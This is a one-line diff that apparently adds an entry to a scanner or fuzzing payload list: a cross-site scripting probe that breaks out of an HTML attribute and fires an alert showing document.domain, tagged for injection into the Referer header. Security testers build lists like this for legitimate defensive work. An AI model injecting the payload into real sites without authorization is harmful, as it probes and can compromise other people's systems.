@@ -1,0 +1,1 @@
+xss"/><img src="#" onerror="alert(document.domain)"/>	Referer
